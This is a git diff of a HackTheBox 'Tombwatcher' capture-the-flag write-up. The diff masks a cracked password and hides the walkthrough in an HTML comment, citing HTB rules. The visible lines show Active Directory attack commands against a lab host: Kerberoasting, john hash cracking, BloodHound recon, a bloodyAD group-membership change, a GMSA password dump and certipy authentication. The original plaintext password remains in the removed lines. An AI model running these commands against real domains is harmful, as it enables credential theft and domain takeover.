@@ -57,11 +57,15 @@ python targetedKerberoast.py -v -d tombwatcher.htb -u henry -p 'H3nry_987TGV!'
 ```
 Crack Hash: Crack the dumped hash using John the Ripper with a wordlist.
 
+**Access Restricted by HackTheBox Rules**
+
+<!--
+
 Bash
 
 ```
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
-The password for Alfred is basketball.
+The password for Alfred is baXXXXXXXll.
 
 ```
 Method 2 - GMSA Password Dump (from alfred to ansible_dev$, then SAM and john)
@@ -70,7 +74,7 @@ Recon as Alfred: Re-run bloodhound-python with Alfred's newly acquired credentia
 Bash
 
 ```
-bloodhound-python -u alfred -p 'basketball' -d tombwatcher.htb -ns 10.10.11.72 -c All --zip
+bloodhound-python -u alfred -p 'baXXXXXXXll' -d tombwatcher.htb -ns 10.10.11.72 -c All --zip
 
 ```
 No immediate Domain Admin path is found, but it's identified that the Infrastructure group is modifiable.
@@ -80,14 +84,14 @@ Infrastructure Group Escalation: Add Alfred to the Infrastructure group using bl
 Bash
 
 ```
-bloodyAD --host '10.10.11.72' -d tombwatcher.htb -u alfred -p 'basketball' add groupMember INFRASTRUCTURE alfred
+bloodyAD --host '10.10.11.72' -d tombwatcher.htb -u alfred -p 'baXXXXXXXll' add groupMember INFRASTRUCTURE alfred
 ```
 
 GMSA Password Dump: Use gMSADumper.py to find and dump Group Managed Service Account (GMSA) blobs.
 
 Bash
 ```
-python gMSADumper.py -u alfred -p basketball -d tombwatcher.htb
+python gMSADumper.py -u alfred -p baXXXXXXXll -d tombwatcher.htb
 ```
 This shows that the Infrastructure group can read the password for ansible_dev$.
 
@@ -223,3 +227,7 @@ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72
 | 10   | cert_admin → DA   | cert-based escalation (ESC15/ESC1/B) | Full domain admin access (Administrator) |
 
 ```
+
+**Pwned! Tombwatcher**
+
+-->
